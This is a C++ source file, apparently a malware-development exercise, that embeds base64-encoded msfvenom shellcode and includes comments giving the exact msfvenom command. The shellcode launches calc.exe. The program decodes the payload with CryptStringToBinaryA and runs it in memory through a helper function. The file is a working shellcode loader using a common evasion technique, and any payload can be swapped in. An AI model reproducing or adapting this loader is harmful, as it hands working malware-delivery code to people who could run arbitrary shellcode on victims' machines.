#include <windows.h>
#include <stdio.h>
#include "../utils/utility.h"

// From the utils folder: openssl enc -e -base64 -in calc.io -out calc.b64
// or certutils -encode calc.io calc.b64 and remove the cert header in the output file
// where calc.ico was generated with 
// msfvenom -p windows/x64/exec CMD="cmd.exe /C calc.exe" EXITFUNC=thread
// --platform windows -a x64 -b "\x00\x0a\x0d" -f raw -o calc.ico
unsigned char exec[] = 
"SDHJSIHp3f///0iNBe////9Iuy8SqR7mkux1SDFYJ0gt+P///+L001oq+hZ6LHUv"
"EuhPp8K+JHlamMyD2mcnT1oiTP7aZycPWiJsttrjwmVY5C8v2t21gy7IYuS+zDTu"
"26Rf51MOmH1T+FZtwMz+bS7hHzYZbP0vEqlWY1KYEmcTeU5t2vQxpFKJV+dCDyNn"
"7WBfbaZkPS7E5C8v2t21g1No1+vT7bQX8tzvqpGgUSdXkM+TSrQxpFKNV+dCijSk"
"HuFabdLwPC7C6JXiGqR0/1PxX77MtS9uSuhHp8ik9sMy6EwZcrQ0dkjhlfR7u4rQ"
"7fRWXJPsdS8SqR7m2mH4LhOpHqco3f5AlVbLXXLxXyVTE7hzL3GK+loq2s6u6gkl"
"klL+k5dXMjxgxnTmy6389e18fYf+j1tKaswe5pLsdQ==";


// compilation:
// I use Mingw-w64 compiler wchich provide libcrypt32.a, a static library which implements functions from wincrypt.h
// wincrypt.h is already included in windows.h. So I just need during the compilation to specify libacrypt32.a to be linked
// in order to my program to resolv all the functions used and declared in wincrypt.h. I achieve that by using -lcrypt32
// wich inform the linker to look for libcrypt32.a in the its current library folder.
// g++ -m64 -o base64Currentprocess.exe base64CurrentProcess.cpp ../utils/utility.cpp -lcrypt32

int main(int argc, char const *argv[])
{
    DWORD   oldProtection;
    HANDLE  threadHandle;
    DWORD   execSize = sizeof(exec);
    BYTE    decoded[execSize];
    DWORD   decodedSize = execSize;

    MESSAGE(INFO, "Start decoding of payload\n");
    MESSAGE(INFO, "Payload located at 0x%p, size: %ld bytes\n", exec, execSize);
    MESSAGE(INFO, "Press <enter> to continue...");
    getchar();

    if (!CryptStringToBinaryA((LPCSTR)exec, execSize, CRYPT_STRING_BASE64, decoded, &decodedSize, NULL, NULL)){
        MESSAGE(FAIL, "Impossible to decode base64 string\n");
        PRINT_ERROR(CryptStringToBinaryA);
        return EXIT_FAILURE;
    }   
    MESSAGE(OKAY, "Payload decoded at 0x%p, size: %ld bytes\n", decoded, decodedSize);

    allowAndExecute(decoded, decodedSize);

    return EXIT_SUCCESS;
}
